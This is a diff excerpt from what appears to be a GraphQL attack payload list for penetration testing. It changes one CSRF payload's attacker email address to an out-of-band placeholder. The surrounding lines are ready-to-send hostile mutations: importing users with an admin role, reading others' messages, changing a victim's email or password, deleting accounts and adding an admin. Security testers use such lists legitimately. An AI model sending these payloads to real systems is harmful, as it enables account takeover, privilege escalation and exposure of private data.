@@ -72,7 +72,7 @@ mutation { import(data: "{\"users\": [{\"role\":\"admin\"}]}") { success } }
 { message(id: 1) { id content sender recipient } }
 
 # ── CSRF VIA GRAPHQL ──
-mutation { changeEmail(email: "attacker@attacker.com") { success } }
+mutation { changeEmail(email: "attacker@{{OOB}}") { success } }
 mutation { changePassword(newPassword: "hacked") { success } }
 mutation { deleteAccount { success } }
 mutation { addAdmin(userId: 1337) { success } }
